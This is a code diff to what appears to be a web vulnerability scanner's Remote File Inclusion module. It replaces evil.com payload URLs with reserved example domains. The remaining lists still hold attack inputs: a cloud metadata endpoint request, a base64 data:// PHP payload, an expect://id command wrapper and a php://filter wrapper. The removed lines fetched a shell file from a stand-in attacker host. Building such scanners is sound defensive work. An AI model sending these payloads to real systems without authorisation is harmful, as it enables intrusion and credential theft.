@@ -24,22 +24,19 @@ class Scanner:
         self.findings = []
         self.module_name = "Remote File Inclusion (RFI) Detection"
         
-        # RFI payloads - using known safe test URLs
+        # RFI payloads - using RFC 2606 reserved domains to prevent unwanted external leaks
         self.rfi_payloads = [
-            'http://evil.com/shell.txt',
+            'http://example.com/test.txt',
             'http://127.0.0.1:8080/test.txt',
             'http://localhost/test.txt',
-            'https://pastebin.com/raw/test',
             'http://169.254.169.254/latest/meta-data/',
-            'ftp://evil.com/shell.txt',
             'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
         ]
-        
+
         # Wrapper payloads
         self.wrapper_payloads = [
-            'php://filter/convert.base64-encode/resource=http://evil.com/shell.txt',
+            'php://filter/convert.base64-encode/resource=http://example.com/test.txt',
             'expect://id',
-            'ogg://http://evil.com/shell.txt',
         ]
         
         # RFI-vulnerable parameter names
